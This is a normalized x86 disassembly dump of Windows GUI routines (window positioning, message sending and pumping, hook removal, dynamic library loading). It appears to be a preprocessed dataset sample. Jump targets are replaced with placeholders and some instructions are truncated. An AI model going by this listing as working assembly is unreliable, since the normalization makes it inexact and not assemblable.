cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40f9e6
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov ebx [ ebp + 0x8 ]
push [ ebx - 0x14 ]
add ebx 0xffffffd0
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x1c ]
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
sub esp 0x10
mov edi esp
lea esi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx ebx
movsd [ edi ] [ esi ]
call [ eax + 0xe4 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x18
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40fa40
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_40bc76
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_40c8f7
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40fa88
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_40bc76
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_40c968
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x4
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40fad0
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_40c9c0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0xc
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40fb1e
push 0x8
mov eax sub_425c9a
call sub_415bc0
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
add esi 0xffffffcc
lea ecx [ ebp - 0x14 ]
call sub_40bc76
push [ ebp + 0xc ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xe8 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
mov esi eax
je r-xdata
mov eax esi
call sub_415c98
retn 0x8
push [ ebp - 0x14 ]
push 0x0
call sub_40af3e
sub_40fb6c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push [ esi - 0x18 ]
lea ecx [ ebp - 0x8 ]
call sub_40bc76
cmp [ ebp - 0x4 ] 0x0
mov eax [ esi - 0x14 ]
mov [ edi ] eax
pop esi
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
push [ ebp - 0x8 ]
push 0x0
call sub_40af3e
pop edi
leave
retn 0x8
sub_40fbbb
mov edi edi
push ebp
mov ebp esp
sub esp 0x60
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_412b76
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x40000000
je r-xdata
mov edi [ eax + 0x20 ]
jmp r-xdata
push 0x4
push [ esi + 0x20 ]
call [ GetWindow@IAT ]
push [ esi + 0x20 ]
call [ GetParent@IAT ]
jmp r-xdata
push ebx
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x38 ]
push eax
push [ esi + 0x20 ]
call ebx
test [ ebp - 0x4 ] 0x40000000
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageW@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x20 ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x28 ]
push eax
push edi
call esi
push 0x2
lea eax [ ebp - 0x28 ]
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
cmp ecx [ ebp - 0x18 ]
pop ebx
jge r-xdata
sub ebx [ ebp - 0x30 ]
add ebx [ ebp - 0x10 ]
mov ecx ebx
mov [ ebp - 0x60 ] 0x28
test edi edi
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongW@IAT ]
test eax 0x10000000
je r-xdata
mov eax [ ebp + 0x8 ]
add eax esi
cmp eax [ ebp - 0xc ]
jle r-xdata
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x28 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_40de19
push eax
call sub_40de86
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_40bd51
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov esi [ ebp - 0x34 ]
sub esi [ ebp - 0x2c ]
add esi [ ebp - 0xc ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x30 ]
mov ebx [ ebp - 0x38 ]
add eax ecx
cdq
sub eax edx
mov ecx eax
sub edi ebx
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x1c ]
sar eax 0x1
sar ecx 0x1
sub ecx eax
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x34 ]
add edi ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x24 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp edi [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_40de19
push eax
call sub_40de86
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x20 ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_412bec
pop edi
pop esi
leave
retn 0x4
mov esi [ ebp - 0x14 ]
sub_40fd7b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x44 ] eax
mov eax [ ecx + 0x3c ]
test al 0x10
je r-xdata
pop ebp
retn 0x4
and eax 0xffffffef
mov [ ecx + 0x3c ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x20 ]
call [ PostMessageW@IAT ]
sub_40fda5
push 0x4
mov eax sub_425cbe
call sub_415bc0
push 0x54
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
call sub_415c98
retn
call sub_40ef35
sub_40fdf9
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
pop esi
retn
push [ esi + 0xc ]
call [ GetModuleHandleW@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push [ esi + 0xc ]
call [ LoadLibraryW@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
setne al
mov [ esi + 0x8 ] al
sub_40fe2d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
pop ebp
retn 0x4
push r--data
call sub_40fdf9
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x10 ] eax
sub_40fe5c
push 0x14
push r--data
call sub_415ff4
mov esi ecx
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_416039
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
mov ecx esi
call sub_40fe2d
mov esi [ esi + 0x10 ]
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
call esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40febf
call sub_40a7dd
sub_40fed0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
pop ebp
retn 0x4
push r--data
call sub_40fdf9
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x14 ] eax
sub_40feff
push 0x18
push r--data
call sub_415ff4
mov esi ecx
xor edi edi
mov [ ebp - 0x20 ] edi
lea eax [ ebp - 0x20 ]
push eax
call sub_40bc2a
push [ eax + 0x80 ]
call sub_40af55
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edi
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_40fed0
mov eax [ esi + 0x14 ]
xor ecx ecx
cmp eax edi
setne cl
cmp ecx edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ff74
mov eax [ ebp - 0x1c ]
call sub_40a7dd
call sub_416039
retn 0x4
sub_40ff74
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] eax
sete al
mov esi eax
test esi esi
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push 0x0
call sub_40af3e
test esi esi
je r-xdata
sub_40ffca
mov edi edi
push esi
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
mov esi eax
test esi esi
jne r-xdata
call [ GetMessageTime@IAT ]
mov [ esi + 0x68 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
cwde
mov [ esi + 0x70 ] eax
mov [ esi + 0x6c ] ecx
lea eax [ esi + 0x58 ]
pop esi
retn
call sub_40a7dd
sub_410008
mov edi edi
push esi
mov esi ecx
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
test eax eax
jne r-xdata
push [ eax + 0x64 ]
mov edx [ esi ]
push [ eax + 0x60 ]
mov ecx esi
push [ eax + 0x5c ]
call [ edx + 0x118 ]
pop esi
retn
call sub_40a7dd
sub_41003a
push 0x0
mov eax sub_425ee0
call sub_415bc0
call sub_40bc5d
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_415c98
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_412d66
call sub_40a5b5
push 0x60
mov ebx eax
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x20
push sub_413265
push sub_40fdd2
push r--data
call sub_40da55
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_40a5b5
sub_4100ae
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push 0x1
call sub_41003a
push [ ebp + 0x8 ]
mov esi eax
mov ecx esi
call sub_40dade
mov edi eax
push esi
mov ecx edi
call sub_412c2a
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_4100da
mov edi edi
push ebp
mov ebp esp
push 0x0
call sub_41003a
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
pop ebp
retn 0x4
add ecx 0x1c
pop ebp
jmp sub_40c3cf
sub_4100fb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
jne r-xdata
push ebx
push 0x1
call sub_41003a
mov ebx eax
push esi
push edi
mov ecx ebx
mov [ esi + 0x20 ] edi
call sub_40ef1c
push ebx
mov ecx esi
call sub_412c2a
xor eax eax
inc eax
pop ebx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_410137
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
and [ esi + 0x50 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41003a
test eax eax
je r-xdata
and [ esi + 0x20 ] 0x0
push [ esi + 0x20 ]
lea ecx [ eax + 0x1c ]
call sub_40c43d
sub_410167
mov edi edi
push esi
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
mov esi eax
test esi esi
jne r-xdata
call sub_40bc2a
cmp [ eax + 0x14 ] 0x0
je r-xdata
call sub_40a7dd
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x28 ] 0x0
sub_4101b4
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
and [ esi + 0x4c ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x0
push 0x0
push eax
call [ ecx + 0xc ]
mov ecx esi
pop esi
jmp sub_410008
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4101f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov esi ecx
call sub_40c74b
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x48 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x20 ] esi
jne r-xdata
mov ecx [ esi + 0x4c ]
xor ebx ebx
inc ebx
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x48 ] ebx
cmp [ edi + 0x24 ] esi
jne r-xdata
call sub_40bc2a
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x4c ] 0x0
test [ esi + 0x3c ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x24 ] ebx
mov [ edi + 0x20 ] ebx
call sub_40bc2a
cmp edi [ eax + 0x4 ]
jne r-xdata
mov eax [ esi + 0x20 ]
mov edi [ GetWindowLongW@IAT ]
push 0xfffffffc
push eax
call edi
mov ecx esi
mov ebx eax
call sub_410008
mov eax [ esi + 0x20 ]
push 0xfffffffc
push eax
call edi
cmp eax ebx
jne r-xdata
call sub_40bc5d
mov edi [ eax + 0x3c ]
test edi edi
je r-xdata
push ebx
call sub_413bc8
call sub_413c8b
test eax eax
je r-xdata
mov ecx esi
call sub_410137
mov eax [ esi ]
mov ecx esi
call [ eax + 0x11c ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf8 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x20 ]
call [ SetWindowLongW@IAT ]
push 0x30
lea eax [ ebp - 0x30 ]
push 0x0
push eax
call sub_415f60
mov eax [ esi + 0x20 ]
add esp 0xc
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x433
push [ edi + 0x20 ]
mov [ ebp - 0x30 ] 0x2c
mov [ ebp - 0x2c ] ebx
call [ SendMessageW@IAT ]
sub_410304
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
push edi
call sub_41003a
cmp eax edi
jne r-xdata
cmp [ esi + 0x50 ] edi
jne r-xdata
push [ esi + 0x20 ]
lea ecx [ eax + 0x1c ]
call sub_40c3cf
call sub_40a7dd
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x50 ] edi
jne r-xdata
cmp [ esi + 0x50 ] edi
je r-xdata
mov eax [ esi + 0x20 ]
cmp eax edi
jne r-xdata
pop edi
pop esi
retn
mov ecx [ esi + 0x50 ]
mov eax [ ecx ]
call [ eax + 0x58 ]
push eax
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax edi
mov edi eax
sub_410363
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
push sub_40a7f9
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_40ada8
test eax eax
jne r-xdata
mov eax [ eax + 0x5c ]
lea ecx [ ebp - 0xc ]
push ecx
sub eax 0x132
push 0x0
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x19
mov ecx esi
call [ eax + 0x110 ]
pop esi
leave
retn 0x8
call sub_40a7dd
sub_4103b4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4103b4
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4103b4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
call sub_4100da
test eax eax
jne r-xdata
call sub_4100ae
jmp r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
sub_41042d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
mov edx [ esi ]
push [ eax + 0x64 ]
mov ecx esi
push [ eax + 0x60 ]
push [ eax + 0x5c ]
call [ edx + 0x120 ]
pop esi
pop ebp
retn 0x4
call sub_40a7dd
sub_410468
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov ecx esi
call sub_410008
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
call [ eax + 0x90 ]
test eax eax
jne r-xdata
pop esi
retn 0x4
sub_41048d
mov edi edi
push ebx
push esi
push edi
mov ebx ecx
call sub_412b76
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_410008
neg eax
sbb eax eax
neg eax
call sub_40bd51
mov edi eax
test edi edi
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x10
call esi
test ax ax
jl r-xdata
push 0x11
call esi
test ax ax
jl r-xdata
push 0x12
call esi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ edi + 0x20 ]
call [ SendMessageW@IAT ]
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_4104f9
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0xec ]
test eax eax
jge r-xdata
call sub_410008
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx esi
jmp r-xdata
pop esi
leave
retn 0x8
sub_410537
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_410008
push 0x0
call sub_41042d
test eax eax
jne r-xdata
pop esi
pop ebp
retn 0xc
sub_41055d
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageW@IAT ]
mov ebx ecx
mov esi 0x121
jmp r-xdata
push 0x1
push esi
push esi
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageW@IAT ]
mov ecx ebx
call sub_410008
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41059f
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0xc ]
push eax
call sub_41042d
test eax eax
je r-xdata
mov ecx esi
call sub_410008
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4105c8
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
lea eax [ ebp - 0x4 ]
push eax
xor edi edi
call sub_40bc2a
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40fed0
cmp [ eax ] edi
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x3fc0
cmp eax [ ebp + 0xc ]
jne r-xdata
push [ ebp + 0x8 ]
call sub_40ffaa
test eax eax
je r-xdata
mov eax edi
pop edi
leave
retn 0x8
call sub_40bc2a
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40fe5c
mov edi 0x3fc0
mov edi [ ebp + 0xc ]
jmp r-xdata
sub_410651
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x10 ] 0x10000000
jne r-xdata
leave
retn 0xc
push esi
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_412b76
test eax 0x50000000
jne r-xdata
pop esi
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x20 ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
mov ecx esi
call sub_410636
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x124 ]
test eax eax
je r-xdata
mov ecx eax
call sub_412baa
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_40fbbb
sub_4106c7
push 0x38
mov eax sub_425d00
call sub_415bf3
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
mov ebx eax
xor eax eax
xor edx edx
cmp ebx edx
setne al
mov [ ebp - 0x18 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebx + 0x58 ]
push 0x7
mov esi eax
pop ecx
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x60 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x5c ] edi
mov [ ebx + 0x64 ] eax
mov [ ebp - 0x4 ] edx
cmp edi 0x2
jne r-xdata
call sub_40a7dd
and [ ebp + 0x8 ] 0x0
cmp edi 0x110
jne r-xdata
cmp [ esi + 0x4c ] edx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ esi ]
push [ ebp + 0x14 ]
mov ecx esi
push edi
call [ eax + 0x110 ]
mov [ ebp + 0x18 ] eax
cmp edi 0x110
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_40ef7a
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
push edx
call [ eax + 0x60 ]
mov eax [ ebp + 0x18 ]
push 0x7
lea edi [ ebx + 0x58 ]
pop ecx
lea esi [ ebp - 0x44 ]
[ edi ] [ esi ]
call sub_415c98
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_410651
jmp r-xdata
sub_4107ba
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_4100da
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ DefWindowProcW@IAT ]
cmp [ eax + 0x20 ] esi
jne r-xdata
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
call sub_4106c7
jmp r-xdata
pop esi
sub_410807
push 0x4
mov eax sub_425d23
call sub_415bc0
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4c ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_40d719
call sub_415c98
retn
cmp [ eax + 0x28 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x28 ] 0x0
cmp esi rw-data
je r-xdata
call sub_410304
sub_41087c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_410008
lea eax [ ebp + 0xc ]
push eax
call sub_41042d
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4108a9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x1
push edi
mov edi ecx
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x20 ]
call sub_4103b4
test eax eax
je r-xdata
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
test eax eax
jne r-xdata
mov ecx edi
call sub_410008
push 0x0
mov ecx eax
call sub_41042d
test eax eax
jne r-xdata
mov ecx [ eax + 0x74 ]
cmp ecx [ edi + 0x20 ]
jne r-xdata
call sub_40a7dd
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
push [ eax + 0x78 ]
call sub_413320
jmp r-xdata
push [ esi + 0x8 ]
push eax
call sub_40f0a9
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
sub_410932
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
jmp r-xdata
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn 0x18
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageW@IAT ]
push esi
call sub_4100da
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x20 ]
push eax
call sub_4106c7
jmp r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_410932
sub_4109b1
push 0x54
mov eax sub_425d46
call sub_415bc0
push 0x0
call sub_41003a
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x1c ]
push edi
mov ecx esi
call sub_40c3cf
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
call sub_41042d
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_40c3cf
test eax eax
je r-xdata
call sub_415c98
retn 0x8
mov eax [ eax + 0x4c ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x24 ]
call sub_40c3cf
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x60 ]
call sub_40e57a
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] esi
call sub_41042d
and [ ebp - 0x40 ] 0x0
xor ecx ecx
test eax eax
setne cl
or [ ebp - 0x4 ] 0xffffffff
mov esi ecx
lea ecx [ ebp - 0x60 ]
call sub_410807
mov eax esi
jmp r-xdata
sub_410a51
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
